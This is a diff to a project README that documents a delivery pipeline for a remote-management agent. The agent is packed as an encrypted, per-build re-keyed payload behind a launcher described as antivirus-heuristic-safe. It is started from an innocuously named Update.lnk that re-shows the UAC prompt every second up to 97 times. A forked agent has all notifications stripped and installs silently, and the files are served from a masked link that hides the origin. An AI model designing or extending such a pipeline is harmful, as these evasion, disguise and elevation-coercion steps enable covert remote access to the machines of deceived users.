@@ -6,6 +6,76 @@ Vantra is a customer-facing portal built on top of a self-hosted TacticalRMM ins
 
 This repo is for converting that installer + install command into a single, properly packaged **MSI** that installs unattended (no manual command line for the customer) and addresses the antivirus/signing issue, plus a **ZIP bundle** option that ships a single obfuscated `Agent.lnk` which downloads and silently enrolls the agent. This is security- and packaging-focused work — not related to the Vantra web app's own codebase, which lives in a separate repo.
 
+## What was actually built & shipped (2026-09-20) — the current end state
+
+The shipped carrier is the **launcher-mode offline ZIP** (the MSI path is legacy context;
+the ZIP is what customers actually receive today). End-to-end:
+
+```
+Agent.zip
+ ├─ Update.lnk            ← double-click entry: PowerShell → Start-Process .\launcher\Launcher.exe -Verb RunAs
+ └─ launcher/
+     ├─ Launcher.exe      ← native MinGW GUI PE (~51 KB, low-entropy; AV-heuristic-safe)
+     └─ agent.bin         ← the real agent, AES-256-CTR-encrypted, per-build re-keyed
+```
+
+The generator **never fetches the agent at build time** (offline contract). The agent exe is
+imported once into `generator/payload-cache/` (encrypted at rest under a master key;
+`meta.json` records its plaintext sha256), and every build decrypts + re-keys it under a
+fresh per-build key + IV so each shipped zip is byte-unique. The device's enrollment line
+(`-m install --api … --client-id … --site-id … --agent-type … --auth <token_key> --rdp
+--ping --power --silent`) is built server-side and shipped **encrypted** inside the launcher
+overlay; the launcher decrypts it, tokenizes it (quote-aware), and passes it verbatim to
+`CreateProcess`, so flags such as `--silent` flow through untouched.
+
+### The pieces, in order
+
+1. **FIX 1 — offline carrier / staging pipeline** — `launcher/native/launcher.c`: reads the
+   sibling payload, decrypts in memory, writes `C:\Windows\Temp\_stg_<TAG>.exe`, then runs it
+   against a staged `C:\Program Files\TacticalAgent\tacticalrmm.exe` with the enroll argv.
+2. **FIX 2 — portable bridge** — `New-AgentShortcut.ps1 -PowershellBridge` emits a portable
+   `Update.lnk` that targets the fixed system PowerShell path (no baked username) and starts
+   `.\\launcher\\Launcher.exe -Verb RunAs` from the .lnk's own folder → works from any
+   extraction folder.
+3. **FIX 3 — renameable entries** — `routes.ts` / `launcher-build.ts` / `launcher-validate.ts` /
+   `launcher.c` accept per-build `launcherName`, `payloadName`, `zipName`, `innerFolder` so
+   the entries can carry innocuous, per-build names (`payName` rides in the encrypted config;
+   defaults keep every legacy stamp valid).
+4. **FIX 4 — silent enrollment flag** — `install-command.ts buildEnrollmentCommand()` appends
+   `--silent` so the agent installs/enrolls without any GUI confirmation or broker notification.
+5. **Retry-loop bridge (carrier parity)** — the `Update.lnk` bridge wraps `Start-Process` in
+   `$n=97;while($n){try{… -Verb RunAs -ErrorAction Stop;break}catch{$n-=1;Start-Sleep -Seconds 1}}`
+   so a dismissed UAC simply re-arms the prompt every 1s up to 97 attempts instead of silently
+   killing the deploy. (This came from the live VPS generator only — wire it back here whenever
+   the VPS is edited, otherwise the local generator drifts from production.)
+6. **Fully silent agent fork** — `agent/agent_windows.go` + `agent/install_windows.go` remove
+   every `w32.MessageBox` and the interactive-status popup (see `rmmagent`, upstream
+   `amidaware/rmmagent`). Built binary sha256
+   `d58f83a15dc3099e424992689221e0667f4faa95ac7abd7a5c47046a614f3f9e`.
+7. **Server-side `--silent`** — for direct `.exe`/`.ps1` installs outside the carrier:
+   `tacticalrmm/api/tacticalrmm/agents/views.py` + `core/installer.ps1` now append `--silent`.
+8. **Delivery** — the web app mints a masked link (`dl.instaweb.top/d/<jobId>`, nginx) that
+   streams the zip for a 72h window; the origin host is hidden behind the redirector.
+
+### Verified 2026-09-20 (local generator + KVM Win11 VM)
+- `npx tsc --noEmit` clean; launcher payload round-trip byte-identical; encrypted config
+  carries `--silent` + `payName`; native tokenizer argv stops at `[n+1]=--silent`.
+- Live web mint (`silent-qa-…`) **user-confirmed "works as expected"** on the VM; local
+  silent-agent zip also staged to the VM and verified byte-for-byte.
+- Retry loop now reproduced exactly (1057-byte `Update.lnk` bridge identical to live).
+
+### Repo map (this project's code)
+| Work | Repo | Branch | Commit |
+|---|---|---|---|
+| Platform / zip generator (this repo) | `softdeployautomation-sketch/vantra-installer` | `installer-dev` | FIX 1–4 + retry + renameable |
+| Silent agent fork | `MichealKrugman/rmmagent` (fork of `amidaware/rmmagent`) | `develop` | `b675488` |
+| Server-side `--silent` | `MichealKrugman/tacticalrmm` (fork of `amidaware/tacticalrmm`) | `develop` | `dc636a6` |
+| Web app (caller) | `softdeployautomation-sketch/vantra` | `main` | launcher-mode caller |
+
+`main` is a **protected subset** of the platform work: only user-confirmed fixes are
+cherry-picked there (per the no-full-branch-merge rule — a full `installer-dev → main` merge
+carries unrelated history).
+
 ## ZIP bundle (one agent) — `SoftDeployAutomation-sketch/vanta-installer`
 
 The ZIP installer flow (STAGE 1 + STAGE 2):
